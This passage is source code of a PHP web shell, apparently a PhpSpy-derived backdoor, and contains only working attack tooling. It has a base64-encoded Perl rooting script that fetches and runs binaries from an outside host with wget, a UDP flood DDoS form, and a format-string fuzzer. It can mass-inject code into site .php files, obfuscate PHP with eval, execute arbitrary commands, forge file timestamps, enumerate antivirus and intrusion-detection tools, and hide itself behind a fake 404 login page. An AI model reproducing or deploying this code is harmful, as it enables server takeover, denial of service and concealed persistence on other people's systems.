MDA3LXBydjgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDctcHJ2 OCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj dHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls ZS9jYy8xOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyANCnN5c3RlbSgiLi8xOCIpOyAN CnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxF Uy9maWxlL2NjLzgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgOCIpOyANCnN5c3RlbSgiLi84Iik7 IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ TEVTL2ZpbGUvY2MvZHoiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZHoiKTsgDQpzeXN0ZW0oIi4v ZHoiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D TVNfRklMRVMvZmlsZS9jYy94ODYiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgeDg2Iik7IA0Kc3lz dGVtKCIuL3g4NiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5 NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2xvbCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBsb2wi KTsgDQpzeXN0ZW0oIi4vbG9sIik7IA0Kc3lzdGVtKCJpZCIpOyANCn0=";
    $fd   = fopen("r00t.pl", "w");
    if ($fd != FALSE) {
        fwrite($fd, base64_decode($r00t));
        $out = exec_all("perl r00t.pl;");
        if ($out != "") {
            $cmd_out = exec_all("whoami");
            if ($cmd_out != "") {
                if (strpos($cmd_out, 'root') !== false) {
                    echo "<br/>You are " . trim(exec_all("whoami")) . ".<br/>";
                } else {
                    echo "<br/>You are " . trim(exec_all("whoami")) . ".<br/>";
                }
            } else {
                echo "<br/>Rooting Failed<br/>";
            }
        }
        unlink("r00t.pl");
    } else {
        echo "An error has occurred.";
    }
    
    
} elseif ($action == 'dos') {
    if (isset($_POST['ip']) && isset($_POST['exTime']) && isset($_POST['port']) && isset($_POST['timeout']) && isset($_POST['exTime']) && $_POST['exTime'] != "" && $_POST['port'] != "" && $_POST['ip'] != "" && $_POST['timeout'] != "" && $_POST['exTime'] != "") {
        $IP            = $_POST['ip'];
        $port          = $_POST['port'];
        $executionTime = $_POST['exTime'];
        $noOfBytes     = $_POST['noOfBytes'];
        $data          = "";
        $timeout       = $_POST['timeout'];
        $packets       = 0;
        $counter       = $noOfBytes;
        $maxTime       = time() + $executionTime;
        ;
        while ($counter--) {
            $data .= "X";
        }
        $data .= "4o4";
        print "I am at work now. Don't close this window untill you receive a message.<br/><br/>";
        while (1) {
            $socket = fsockopen("udp://$IP", $port, $error, $errorString, $timeout);
            if ($socket) {
                fwrite($socket, $data);
                fclose($socket);
                $packets++;
            }
            if (time() >= $maxTime) {
                break;
            }
        }
        echo "<script>alert('DDoS Completed!');</script>";
        echo "DOS attack against udp://$IP:$port completed on " . date("h:i:s A") . "<br/>";
        echo "Total Number of Packets Sent: " . $packets . "<br/>";
        echo "Total Data Sent: " . sizecount($packets * $noOfBytes) . "<br/>";
        echo "Data per packet: " . sizecount($noOfBytes) . "<br/>";
    } else {
?>
       <form method="POST">
           <input type="hidden" name="dos" />
                       IP
                       <input onmouseover="this.focus();" class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == '127.0.0.1')this.value = ;" onblur="if(this.value==)this.value='127.0.0.1';"/>
                       <br/>Port
                       <input onmouseover="this.focus();" class="cmd" name="port" value="80" onfocus="if(this.value == '80')this.value = ;" onblur="if(this.value==)this.value='80';"/>
                       <br/>Timeout (Time in seconds)
                       <input onmouseover="this.focus();" type="text" class="cmd" name="timeout" value="5" onfocus="if(this.value == '5')this.value = ;" onblur="if(this.value==)this.value='5';" />
                       <br/>Execution Time (Time in seconds) 
                       <input onmouseover="this.focus();" type="text" class="cmd" name="exTime" value="10" onfocus="if(this.value == '10')this.value = ;" onblur="if(this.value==)this.value='10';"/>
                       <br/>Number of Bytes per/packet
                       <input onmouseover="this.focus();" type="text" class="cmd" name="noOfBytes" value="1048576" onfocus="if(this.value == '1048576')this.value = ;" onblur="if(this.value==)this.value='1048576';"/>
                       <br/><input type="submit" class="bt" value="DDoS"/>
       <?php
        makehide('action', 'dos');
        echo "</form>";
    }
    
} elseif ($action == 'fuzz') {
    if (isset($_POST['ip']) && isset($_POST['port']) && isset($_POST['times']) && isset($_POST['time']) && isset($_POST['message']) && isset($_POST['messageMultiplier']) && $_POST['message'] != "" && $_POST['time'] != "" && $_POST['times'] != "" && $_POST['port'] != "" && $_POST['ip'] != "" && $_POST['messageMultiplier'] != "") {
        $IP         = $_POST['ip'];
        $port       = $_POST['port'];
        $times      = $_POST['times'];
        $timeout    = $_POST['time'];
        $send       = 0;
        $ending     = "";
        $multiplier = $_POST['messageMultiplier'];
        $data       = "";
        $mode       = "tcp";
        $data .= "GET /";
        $ending .= " HTTP/1.1\n\r\n\r\n\r\n\r";
        if ($_POST['type'] == "tcp") {
            $mode = "tcp";
        }
        while ($multiplier--) {
            $data .= urlencode($_POST['message']);
        }
        $data .= "%s%s%s%s%d%x%c%n%n%n%n"; // add some format string specifiers
        $data .= "4o4" . $ending;
        $length = strlen($data);
        
        
        echo "Sending Data :-<br/>"; //.$data."</br>";
        print "I am working now! Don't close this window untill you receive a message.<br/><br/>";
        for ($i = 0; $i < $times; $i++) {
            $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $timeout);
            if ($socket) {
                fwrite($socket, $data, $length);
                fclose($socket);
            }
        }
        echo "<script>alert('Fuzzing Completed!');</script>";
        echo "DOS attack against $mode://$IP:$port completed on " . date("h:i:s A") . "<br/>";
        echo "Total Number of Packets Sent: " . $times . "</br>";
        echo "Total Data Sent: " . sizecount($times * $length) . "<br/>";
        echo "Data per packet: " . sizecount($length) . "<br/>";
    } else {
?>
       <form method="POST">
           <input type="hidden" name="fuzz" />
                       IP
                       <input onmouseover="this.focus();" class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == '127.0.0.1')this.value = ;" onblur="if(this.value==)this.value='127.0.0.1';"/>
                       <br/>Port
                       <input onmouseover="this.focus();" class="cmd" name="port" value="80" onfocus="if(this.value == '80')this.value = ;" onblur="if(this.value==)this.value='80';"/>
                       <br/>Timeout
                       <input onmouseover="this.focus();" type="text" class="cmd" name="time" value="5" onfocus="if(this.value == '5')this.value = ;" onblur="if(this.value==)this.value='5';"/>
                       <br/>Number of times
                       <input onmouseover="this.focus();" type="text" class="cmd" name="times" value="100" onfocus="if(this.value == '100')this.value = ;" onblur="if(this.value==)this.value='100';" />
                       <br/>Message (The message Should be long and it will be multiplied with the value after it)
                       <input onmouseover="this.focus();" class="cmd" name="message" value="%S%x--Some Garbage Here--%x%S" onfocus="if(this.value == '%S%x--Some Garbage here --%x%S')this.value = ;" onblur="if(this.value==)this.value='%S%x--Some Garbage here --%x%S';"/>
                       x
                       <input onmouseover="this.focus();" style="width: 30px;" class="cmd" name="messageMultiplier" value="10" />
                       <br/><input type="submit" class="bt" value="Fuzz"/>
       <?php
        makehide('action', 'fuzz');
        echo '</form>';
    }
} elseif ($action == 'cej') {
    $self      = $_SERVER["PHP_SELF"]; // Where am i
    $SEPARATOR = '/';
    if (isset($_POST['dir']) && $_POST['dir'] != "" && isset($_POST['filetype']) && $_POST['filetype'] != "" && isset($_POST['message']) && $_POST['message'] != "") {
        $dir      = $_POST['dir'];
        $filetype = $_POST['filetype'];
        $message  = $_POST['message'];
        if ($handle = opendir($dir)) {
            echo "Overwritten Files :-<br/>";
            while (($file = readdir($handle)) !== False) {
                if ((preg_match("/$filetype" . '$' . '/', $file, $matches) != 0) && (preg_match('/' . $file . '$/', $self, $matches) != 1)) {
                    $fd = fopen($dir . $file, "r");
                    if ($fd == false) {
                    } else {
                        $content = fread($fd, filesize($dir . $file));
                        fclose($fd);
                        
                        
                        if ($_POST['mc']) {
                            if (strstr($content, $message)) {
                                $fd = fopen($dir . $file, "w");
                                echo "<a href='" . str_replace($_SERVER["DOCUMENT_ROOT"], '', $dir) . $file . "'>" . $file . "</a><br/>";
                                fwrite($fd, recursive_str_replace($message, "", $content));
                                fclose($fd);
                            }
                        } else {
                            if (stristr($content, $message)) {
                                $fd = fopen($dir . $file, "w");
                                echo "<a href='" . str_replace($_SERVER["DOCUMENT_ROOT"], '', $dir) . $file . "'>" . $file . "</a><br/>";
                                fwrite($fd, recursive_str_ireplace($message, "", $content));
                                fclose($fd);
                            }
                        }
                        
                        
                        
                    }
                }
            }
        }
    } else {
        echo '
<form method=\'POST\'>
                       Directory<input onmouseover="this.focus();" class="cmd" name="dir" value="' . $nowpath . '" />
                       File Type
                       <input onmouseover="this.focus();" type="text" class="cmd" name="filetype" value=".php" onblur="if(this.value==)this.value=\'.php\';" /><br/>
                       <textarea onmouseover="this.focus();" name="message" cols="110" rows="10" class="cmd"></textarea><br/>
                       <input type="checkbox" name="mc" id="mc"><label for="mc">Match Case</label><br/>
                       <input type="submit" class="bt" value="Eject"/>';
        makehide('action', 'cej');
        echo '</form>';
    }
} elseif ($action == 'cinj') {
    $self      = $_SERVER["PHP_SELF"]; // Where am i
    $SEPARATOR = '/';
    if (isset($_POST['dir']) && $_POST['dir'] != "" && isset($_POST['filetype']) && $_POST['filetype'] != "" && isset($_POST['mode']) && $_POST['mode'] != "" && isset($_POST['message']) && $_POST['message'] != "") {
        $dir      = $_POST['dir'];
        $filetype = $_POST['filetype'];
        $message  = $_POST['message'];
        $mode     = "a";
        if ($_POST['mode'] == 'Append') {
            $mode = "a";
            echo "Appended Files :-<br/>";
        }
        if ($_POST['mode'] == 'Overwrite') {
            $mode = "w";
            echo "Overwritten Files :-<br/>";
        }
        if ($handle = opendir($dir)) {
            while (($file = readdir($handle)) !== False) {
                if ((preg_match("/$filetype" . '$' . '/', $file, $matches) != 0) && (preg_match('/' . $file . '$/', $self, $matches) != 1)) {
                    echo "<a href='" . str_replace($_SERVER["DOCUMENT_ROOT"], '', $dir) . $file . "'>" . $file . "</a>";
                    $fd = fopen($dir . $file, $mode);
                    if ($fd == false) {
                        echo " - Permission Denied<br/>";
                    } else {
                        echo "<br/>";
                        fwrite($fd, $message);
                        fclose($fd);
                    }
                }
            }
        }
    } else {
        echo '
<form method=\'POST\'>
                       Directory<input onmouseover="this.focus();" class="cmd" name="dir" value="' . $nowpath . '" />
                   Mode<select style="width: 400px;" name="mode" class="cmd">
                           <option value="Append">Append</option>
                           <option value="Overwrite">Overwrite</option>
                       </select>
                       File Type
                       <input onmouseover="this.focus();" type="text" class="cmd" name="filetype" value=".php" onblur="if(this.value==)this.value=\'.php\';" /><br/>
                       <textarea onmouseover="this.focus();" name="message" cols="110" rows="10" class="cmd"></textarea><br/>
                       <input type="submit" class="bt" value="Inject"/>';
        makehide('action', 'cinj');
        echo '</form>';
    }
    
} elseif ($action == 'pob') {
    if (isset($_POST['code']) && $_POST['code'] != "") {
        $encoded = base64_encode(bzcompress(trim(stripslashes($_POST['code'] . ' '), '<?php,?>,<?,<?PHP,<?Php,<?PHp,<?pHp,<?pHP,<?phP'), 9)); // high Compression! :P
        $encode  = "<" . "?PHP\n$"."b = strrev(\"edoced_4\".\"6esab\");\n$"."encoded = \"" . $encoded . "\";\neval(bzdecompress($"."b($"."encoded)));\n?" . ">";
    } else {
        $encode = "<" . "?PHP\n\n\n\n?" . ">";
    }
formhead(array(
        'title' => 'Obfuscate PHP Code'
    ));
    makehide('action', 'pob');
maketext(array(
        'title' => 'PHP Code',
        'name' => 'code',
        'dataeditor' => 'php',
        'value' => $encode
    ));
      formfooter();
    p('<script src="http://ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script><script src="http://ajaxorg.github.io/ace-builds/src-noconflict/ext-modelist.js"></script>');
    p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("example.php").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){e.value=r.getSession().getValue()}}}</script>');
    
} elseif ($action == 'SelfRemove') {
    if (!isset($_POST['SelfRemoveSure'])) {
        echo "<h1>Are you sure you want to delete this shell?</h1>";
        echo "<form name='ds' method='post'>";
        makehide('action', 'SelfRemove');
        echo "<input class='bt' type='submit' name='SelfRemoveSure' value='Yes'><input class='bt' type='submit' name='SelfRemoveSure' value='No'></form>";
    } else {
        if ($_POST['SelfRemoveSure'] == "Yes") {
            if (unlink(preg_replace('@\(.*\(.*$@', '', __FILE__))) {
                die('Shell has been removed!');
            } else {
                echo 'Unlink error!';
            }
        } else {
            echo "File not deleted.";
        }
    }
} elseif ($action == 'eval') {
    $phpcode = trim($phpcode);
    if ($phpcode) {
        if (!preg_match('/<\?/si', $phpcode)) {
            $phpcode = "<?PHP\n\n{$phpcode}";
        }
        if(!preg_match('/\?>/si', $phpcode)){
        		$phpcode .= "\n\n?>";
        }
        eval("?" . ">$phpcode<?php");
        echo "</>";
    }
    formhead(array(
        'title' => 'Eval PHP Code'
    ));
    makehide('action', 'eval');
    $phpcode = $phpcode == "" ? "<" . "?PHP\n\n\n\n?" . ">" : $phpcode;
    maketext(array(
        'title' => 'PHP Code',
        'name' => 'phpcode',
        'dataeditor' => 'php',
        'value' => htmlspecialchars($phpcode)
    ));
    p('<p><a href="http://w' . 'ww.4ng' . 'el.net/php' . 'spy/pl' . 'ugin/" target="_blank">Get plugins</a></p>');
    p('<script src="http://ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script><script src="http://ajaxorg.github.io/ace-builds/src-noconflict/ext-modelist.js"></script>');
    p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("example.php").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){e.value=r.getSession().getValue()}}}</script>');
    
    formfooter();
} elseif ($action == 'editfile') {
    if (file_exists($opfile)) {
        $fp       = @fopen($opfile, 'r');
        $contents = @fread($fp, filesize($opfile));
        @fclose($fp);
        $contents = htmlspecialchars($contents);
    }
    formhead(array(
        'title' => 'Create / Edit File'
    ));
    makehide('action', 'file');
    makehide('dir', $nowpath);
    makeinput(array(
        'title' => 'Current File (import new file name and new file)',
        'name' => 'editfilename',
        'value' => $opfile,
        'newline' => 1
    ));
    maketext(array(
        'title' => 'File Content',
        'name' => 'filecontent',
        'dataeditor' => 'javascript', //clang(pathinfo($opfile, PATHINFO_EXTENSION)),
        'value' => $contents
    ));
    
    p('<script src="http://ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script><script src="http://ajaxorg.github.io/ace-builds/src-noconflict/ext-modelist.js"></script>');
    p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("' . $opfile . '").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){e.value=r.getSession().getValue()}}}</script>');
    formfooter();
    goback();
} elseif ($action == 'newtime') {
    $opfilemtime = @filemtime($opfile);
    $cachemonth  = array(
        'January' => 1,
        'February' => 2,
        'March' => 3,
        'April' => 4,
        'May' => 5,
        'June' => 6,
        'July' => 7,
        'August' => 8,
        'September' => 9,
        'October' => 10,
        'November' => 11,
        'December' => 12
    );
    formhead(array(
        'title' => 'Clone folder/file was last modified time'
    ));
    makehide('action', 'file');
    makehide('dir', $nowpath);
    makeinput(array(
        'title' => 'Alter folder/file',
        'name' => 'curfile',
        'value' => $opfile,
        'size' => 120,
        'newline' => 1
    ));
    makeinput(array(
        'title' => 'Reference folder/file (fullpath)',
        'name' => 'tarfile',
        'size' => 120,
        'newline' => 1
    ));
    formfooter();
    formhead(array(
        'title' => 'Set last modified'
    ));
    makehide('action', 'file');
    makehide('dir', $nowpath);
    makeinput(array(
        'title' => 'Current folder/file (fullpath)',
        'name' => 'curfile',
        'value' => $opfile,
        'size' => 120,
        'newline' => 1
    ));
    p('<p>year:');
    makeinput(array(
        'name' => 'year',
        'value' => date('Y', $opfilemtime),
        'size' => 4
    ));
    p('month:');
    makeinput(array(
        'name' => 'month',
        'value' => date('m', $opfilemtime),
        'size' => 2
    ));
    p('day:');
    makeinput(array(
        'name' => 'day',
        'value' => date('d', $opfilemtime),
        'size' => 2
    ));
    p('hour:');
    makeinput(array(
        'name' => 'hour',
        'value' => date('H', $opfilemtime),
        'size' => 2
    ));
    p('minute:');
    makeinput(array(
        'name' => 'minute',
        'value' => date('i', $opfilemtime),
        'size' => 2
    ));
    p('second:');
    makeinput(array(
        'name' => 'second',
        'value' => date('s', $opfilemtime),
        'size' => 2
    ));
    p('</p>');
    formfooter();
    goback();
} elseif ($action == 'shell') {
    if (IS_WIN && IS_COM) {
        if ($program && $parameter) {
            $shell = new COM('Shell.Application');
            $a     = $shell->ShellExecute($program, $parameter);
            m('Program run has ' . (!$a ? 'success' : 'fail'));
        }
        !$program && $program = 'c:\windows\system32\cmd.exe';
        !$parameter && $parameter = '/c net start > ' . SA_ROOT . 'log.txt';
        formhead(array(
            'title' => 'Execute Program'
        ));
        makehide('action', 'shell');
        makeinput(array(
            'title' => 'Program',
            'name' => 'program',
            'value' => $program,
            'newline' => 1
        ));
        p('<p>');
        makeinput(array(
            'title' => 'Parameter',
            'name' => 'parameter',
            'value' => $parameter
        ));
        makeinput(array(
            'name' => 'submit',
            'class' => 'bt',
            'type' => 'submit',
            'value' => 'Execute'
        ));
        p('</p>');
        formfoot();
    }
    formhead(array(
        'title' => 'Execute Command'
    ));
    makehide('action', 'shell');
    if (IS_WIN && IS_COM) {
        $execfuncdb = array(
            'phpfunc' => 'phpfunc',
            'wscript' => 'wscript',
            'proc_open' => 'proc_open'
        );
        makeselect(array(
            'title' => 'Use:',
            'name' => 'execfunc',
            'option' => $execfuncdb,
            'selected' => $execfunc,
            'newline' => 1
        ));
    }
    p('<p>');
    makeinput(array(
        'title' => 'Command',
        'name' => 'command',
        'value' => htmlspecialchars($command)
    ));
    makeinput(array(
        'name' => 'submit',
        'class' => 'bt',
        'type' => 'submit',
        'value' => 'Execute'
    ));
    p('</p>');
    formfoot();
    if ($command) {
        p('<hr width="100%" noshade /><pre>');
        if ($execfunc == 'wscript' && IS_WIN && IS_COM) {
            $wsh       = new COM('WScript.shell');
            $exec      = $wsh->exec('cmd.exe /c ' . $command);
            $stdout    = $exec->StdOut();
            $stroutput = $stdout->ReadAll();
            echo $stroutput;
        } elseif ($execfunc == 'proc_open' && IS_WIN && IS_COM) {
            $descriptorspec = array(
                0 => array(
                    'pipe',
                    'r'
                ),
                1 => array(
                    'pipe',
                    'w'
                ),
                2 => array(
                    'pipe',
                    'w'
                )
            );
            $process        = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
            if (is_resource($process)) {
                fwrite($pipes[0], $command . "\r\n");
                fwrite($pipes[0], "exit\r\n");
                fclose($pipes[0]);
                while (!feof($pipes[1])) {
                    echo fgets($pipes[1], 1024);
                }
                fclose($pipes[1]);
                while (!feof($pipes[2])) {
                    echo fgets($pipes[2], 1024);
                }
                fclose($pipes[2]);
                proc_close($process);
            }
        } else {
            echo (execute($command));
        }
        p('</pre>');
    }
} elseif ($action == 'phpenv') {
    $upsize    = getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
    $adminmail = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
    !$dis_func && $dis_func = 'No';
    $info = array(
        1 => array(
            'Server Time',
            date('Y/m/d h:i:s', $timestamp)
        ),
        2 => array(
            'Server Domain',
            $_SERVER['SERVER_NAME']
        ),
        3 => array(
            'Server IP',
            gethostbyname($_SERVER['SERVER_NAME'])
        ),
        4 => array(
            'Server OS',
            PHP_OS
        ),
        5 => array(
            'Server OS Charset',
            $_SERVER['HTTP_ACCEPT_LANGUAGE']
        ),
        6 => array(
            'Server Software',
            $_SERVER['SERVER_SOFTWARE']
        ),
        7 => array(
            'Server Web Port',
            $_SERVER['SERVER_PORT']
        ),
        8 => array(
            'PHP run mode',
            strtoupper(php_sapi_name())
        ),
        9 => array(
            'The file path',
            preg_replace('@\(.*\(.*$@', '', __FILE__)
        ),
        10 => array(
            'PHP Version',
            PHP_VERSION
        ),
        11 => array(
            'PHPINFO',
            (IS_PHPINFO ? '<a href="javascript:g(\'phpinfo\');">Yes</a>' : 'No')
        ),
        12 => array(
            'Safe Mode',
            getcfg('safe_mode')
        ),
        13 => array(
            'Administrator',
            $adminmail
        ),
        14 => array(
            'allow_url_fopen',
            getcfg('allow_url_fopen')
        ),
        15 => array(
            'enable_dl',
            getcfg('enable_dl')
        ),
        16 => array(
            'display_errors',
            getcfg('display_errors')
        ),
        17 => array(
            'register_globals',
            getcfg('register_globals')
        ),
        18 => array(
            'magic_quotes_gpc',
            getcfg('magic_quotes_gpc')
        ),
        19 => array(
            'memory_limit',
            getcfg('memory_limit')
        ),
        20 => array(
            'post_max_size',
            getcfg('post_max_size')
        ),
        21 => array(
            'upload_max_filesize',
            $upsize
        ),
        22 => array(
            'max_execution_time',
            getcfg('max_execution_time') . ' second(s)'
        ),
        23 => array(
            'disable_functions',
            str_replace(",", ", ", $dis_func)
        )
    );
    if ($phpvarname) {
        m($phpvarname . ' : ' . getcfg($phpvarname));
    }
    formhead(array(
        'title' => 'Server environment'
    ));
    makehide('action', 'phpenv');
    makeinput(array(
        'title' => 'Please input PHP configuration parameter(eg:magic_quotes_gpc)',
        'name' => 'phpvarname',
        'value' => $phpvarname,
        'newline' => 1
    ));
    formfooter();
    $hp = array(
        0 => 'Server',
        1 => 'PHP'
    );
    for ($a = 0; $a < 2; $a++) {
        p('<h2>' . $hp[$a] . '</h2>');
        p('<ul class="info">');
        if ($a == 0) {
            for ($i = 1; $i <= 9; $i++) {
                p('<li><u>' . $info[$i][0] . ':</u>' . $info[$i][1] . '</li>');
            }
        } elseif ($a == 1) {
            for ($i = 10; $i <= 23; $i++) {
                p('<li><u>' . $info[$i][0] . ':</u>' . $info[$i][1] . '</li>');
            }
        }
        p('</ul>');
    }
} elseif ($action == 'secinfo') {
    $s                  = "";
    $disabled_functions = ini_get('disable_functions');
    if ($disabled_functions != '') {
        $arr = explode(', ', $disabled_functions);
        sort($arr);
        for ($i = 0; $i < count($arr); $i++) {
            if ($s == "") {
                $s = $arr[$i];
            } else {
                $s .= '<br/>' . $arr[$i];
            }
        }
    } else {
        $s = 'None';
    }
    secparam('Server software', @getenv('SERVER_SOFTWARE'));
    secparam('Disabled PHP Functions', $s); //($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'None');
    secparam('Open base dir', @ini_get('open_basedir'));
    secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
    secparam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
    secparam('cURL support', function_exists('curl_version') ? 'Enabled' : 'No');
    $temp = array();
    if (function_exists('mysql_get_client_info'))
        $temp[] = "MySQL (" . mysql_get_client_info() . ")";
    if (function_exists('mssql_connect'))
        $temp[] = "MSSQL";
    if (function_exists('pg_connect'))
        $temp[] = "PostgreSQL";
    if (function_exists('oci_connect'))
        $temp[] = "Oracle";
    secparam('Supported databases', implode(', ', $temp));
    if (!IS_WIN) {
        $userful     = array(
            'gcc',
            'lcc',
            'cc',
            'ld',
            'make',
            'php',
            'perl',
            'python',
            'ruby',
            'tar',
            'gzip',
            'bzip',
            'bzip2',
            'nc',
            'locate',
            'suidperl'
        );
        $danger      = array(
            'kav',
            'nod32',
            'bdcored',
            'uvscan',
            'sav',
            'drwebd',
            'clamd',
            'rkhunter',
            'chkrootkit',
            'iptables',
            'ipfw',
            'tripwire',
            'shieldcc',
            'portsentry',
            'snort',
            'ossec',
            'lidsadm',
            'tcplodg',
            'sxid',
            'logcheck',
            'logwatch',
            'sysmask',
            'zmbscap',
            'sawmill',
            'wormscan',
            'ninja'
        );
        $downloaders = array(
            'wget',
            'fetch',
            'lynx',
            'links',
            'curl',
            'get',
            'lwp-mirror'
        );
        secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "Yes" : 'No');
        secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "Yes" : 'No');
        secparam('OS version', @file_get_contents('/proc/version'));
        secparam('Distribution name', @file_get_contents('/etc/issue.net'));
        $safe_mode = @ini_get('safe_mode');
        if (!$GLOBALS['safe_mode']) {
            $temp = array();
            foreach ($userful as $item)
                if (which($item)) {
                    $temp[] = $item;
                }
            secparam('Userful', implode(', ', $temp));
            $temp = array();
            foreach ($danger as $item)
                if (which($item)) {
                    $temp[] = $item;
                }
            secparam('Danger', implode(', ', $temp));
            $temp = array();
            foreach ($downloaders as $item)
                if (which($item)) {
                    $temp[] = $item;
                }
            secparam('Downloaders', implode(', ', $temp));
            secparam('Hosts', @file_get_contents('/etc/hosts'));
            secparam('HDD space', execute('df -h'));
            secparam('Mount options', @file_get_contents('/etc/fstab'));
        }
    } else {
        secparam('OS Version', execute('ver'));
        secparam('Account Settings', execute('net accounts'));
        secparam('User Accounts', execute('net user'));
        secparam('IP Configurate', execute('ipconfig -all'));
    }
} else {
    m('Undefined Action');
}
;
echo '</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
<span style="display: block; text-align: right;">';
debuginfo();
ob_end_flush();
;
echo '</span>
</div>
</body>
</html>

';
function secparam($n, $v)
{
    $v = trim($v);
    if ($v) {
        p('<h2>' . $n . '</h2>');
        p('<div class="infolist">');
        if (strpos($v, "\n") === false)
            p($v . '<br />');
        else
            p('<pre>' . $v . '</pre>');
        p('</div>');
    }
}
function m($msg)
{
    echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
    echo $msg;
    echo '</div>';
}
function scookie($key, $value, $life = 0, $prefix = 1)
{
    global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
    $key     = ($prefix ? $cookiepre : '') . $key;
    $life    = $life ? $life : $cookielife;
    $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
    setcookie($key, $value, $timestamp + $life, $cookiepath, $cookiedomain, $useport);
}
function multi($num, $perpage, $curpage, $tablename)
{
    $multipage = '';
    if ($num > $perpage) {
        $page   = 10;
        $offset = 5;
        $pages  = @ceil($num / $perpage);
        if ($page > $pages) {
            $from = 1;
            $to   = $pages;
        } else {
            $from = $curpage - $offset;
            $to   = $curpage + $page - $offset - 1;
            if ($from < 1) {
                $to   = $curpage + 1 - $from;
                $from = 1;
                if (($to - $from) < $page && ($to - $from) < $pages) {
                    $to = $page;
                }
            } elseif ($to > $pages) {
                $from = $curpage - $pages + $to;
                $to   = $pages;
                if (($to - $from) < $page && ($to - $from) < $pages) {
                    $from = $pages - $page + 1;
                }
            }
        }
        $multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\', \'\', 1);">First</a> ' : '') . ($curpage > 1 ? '<a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\', \'\', ' . ($curpage - 1) . ');">Prev</a> ' : '');
        for ($i = $from; $i <= $to; $i++) {
            $multipage .= $i == $curpage ? $i . ' ' : '<a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\', \'\', ' . $i . ');">[' . $i . ']</a> ';
        }
        $multipage .= ($curpage < $pages ? '<a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\', \'\', ' . ($curpage + 1) . ');">Next</a>' : '') . ($to < $pages ? ' <a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\', \'\', ' . $pages . ');">Last</a>' : '');
        $multipage = $multipage ? '<p>Pages: ' . $multipage . '</p>' : '';
    }
    return $multipage;
}
    function is_win()
    {
        return (strtolower(substr(php_uname(), 0, 3)) == "win") ? true : false;
    }
function loginpage($aep)
{
    $epage = $aep ? geterrorpage() : "";
    if ($epage == "") {
        echo '<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ' . $_SERVER['PHP_SELF'] . ' was not found on this server.</p><hr>';
